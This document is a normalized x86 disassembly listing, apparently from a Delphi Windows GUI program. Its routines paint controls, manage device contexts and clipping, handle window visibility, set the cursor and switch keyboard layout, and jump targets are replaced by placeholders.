mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e5ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e57b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a5d0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_44e5ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41a62c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_41a5d0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41919c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_41a5d0
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_422fe8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41919c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_422fe8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41919c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4488f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_44b16c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_44e7dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4488f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_44b16c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_44b16c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4488f4
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_44e7dc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_41a5d0
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_44e930
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e454
jmp r-xdata
mov eax ebx
call sub_44d4d0
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ea82
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4507d8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_44b16c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_44e930
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4507d8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_44ea90
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eab0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb24
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb44
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb64
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44eb88
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ebac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ebd0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ebf4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_43a9dc
mov edi eax
mov eax edi
call sub_43aabc
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_423cc8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_43ac54
jmp r-xdata
sub_44ec7c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_44baa0
test bl bl
je r-xdata
mov eax edi
call sub_450ae8
mov eax edi
call sub_4506e0
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_4506e0
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_44ed3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_44b6fc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_44ed8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450ae8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44d060
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403450
sub_44edd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_449afc
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44e08c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a6e4
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_44ef24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44f003
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f00a
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4507d8
mov dl [ ebx + 0x184 ]
call sub_45547c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468b44
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408298
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468944
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468944
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468944
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_44f010
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f09a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f0a1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468b44
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_408298
test eax eax
je r-xdata
mov eax ebx
call sub_4507d8
mov dl 0x1
call sub_455460
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_44f0fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_41918c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44b16c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_44f14c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_44f180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403450
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403450
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44f1c0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44b16c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44f218
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4204cc
mov edx [ r-xdata ]
call sub_403404
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_44f250
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_41a5d0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f274
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4507d8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_44f2d0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44f23c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a5d0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44f310
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_405a20
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_405a20
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44f37c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44f424
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f42b
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_447c64
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403254
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_405a08
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403450
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_405a20
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ edi + 0x178 ] eax
sub_44f434
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44d038
xor edx edx
push ebp
push sub_44f4f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403450
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4fd
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44f4fd
mov eax [ ebp - 0x4 ]
call sub_461dc8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44a218
sub_44f548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40319c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44be2c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44f5b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44a218
sub_44f5cc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44f5f4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_461dc8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_461cd0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403450
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44f5f4
test al al
jne r-xdata
sub_44f65c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f5f4
test al al
jne r-xdata
